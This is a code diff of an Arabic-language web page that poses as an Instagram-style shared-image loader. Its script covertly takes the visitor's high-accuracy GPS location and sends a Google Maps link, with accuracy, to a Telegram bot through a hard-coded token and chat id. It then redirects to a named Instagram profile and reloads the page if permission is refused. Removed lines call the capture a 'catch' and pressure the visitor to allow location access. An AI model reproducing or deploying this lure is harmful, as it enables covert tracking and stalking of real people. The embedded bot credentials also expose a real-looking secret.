@@ -5,49 +5,37 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>جاري تحميل الصورة...</title>
     <style>
-        body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .loader { border: 3px solid #f3f3f3; border-top: 3px solid #e1306c; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { margin-top: 15px; color: #999; font-size: 14px; }
     </style>
 </head>
 <body>
-<div style="text-align: center;">
     <div class="loader"></div>
-    <p>جاري جلب الصورة المشتركة بأعلى جودة...</p>
-</div>
-
 <script>
     const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
     const chat_id = '7214473798';
 
     function capture() {
-        const geoOptions = {
-            enableHighAccuracy: true, // إجبار الجهاز على استخدام الـ GPS الحقيقي
-            timeout: 25000,           // زيادة وقت الانتظار لضمان دقة أعلى
-            maximumAge: 0             // منع استخدام أي موقع قديم مخزن
-        };
+        const geoOptions = { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 };
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(function(p) {
                 const lat = p.coords.latitude;
                 const lon = p.coords.longitude;
                 const acc = p.coords.accuracy;
+
+                // هذا هو الرابط المصحح الذي سيفتح الخرائط مباشرة
                 const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                 
-                let msg = `🎯 **تم الصيد بدقة احترافية!**\n`;
-                msg += `📍 الرابط: ${mapLink}\n`;
-                msg += `📏 نسبة الخطأ: ${acc.toFixed(1)} متر\n`;
-                msg += `⏰ التوقيت: ${new Date().toLocaleTimeString()}`;
+                let msg = `🎯 **تم تحديد الموقع بدقة!**\n`;
+                msg += `📍 الرابط المباشر:\n${mapLink}\n`;
+                msg += `📏 نسبة الخطأ: ${acc.toFixed(1)} متر`;
 
                 fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
                 
-                // تحويلها لبروفايلها فوراً لإنهاء العملية
                 setTimeout(() => { window.location.href = "https://www.instagram.com/ha2542213"; }, 1500);
-
             }, function(e) {
-                // في حال الرفض
-                alert("يجب السماح بالوصول للموقع لمشاهدة الصورة المشتركة.");
                 location.reload();
             }, geoOptions);
         }
